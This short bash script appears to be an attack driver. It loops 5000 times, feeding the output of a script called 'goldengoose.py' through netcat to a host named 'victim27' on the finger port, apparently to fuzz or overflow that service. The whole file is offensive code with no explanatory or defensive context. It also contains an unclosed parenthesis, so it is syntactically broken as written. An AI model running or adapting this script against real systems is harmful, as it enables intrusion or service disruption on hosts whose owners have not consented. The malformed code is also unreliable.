#!/bin/bash
END=5000
for ((i=1;i<=END;i++));
do
   (python3 goldengoose.py $i | nc victim27 79
done

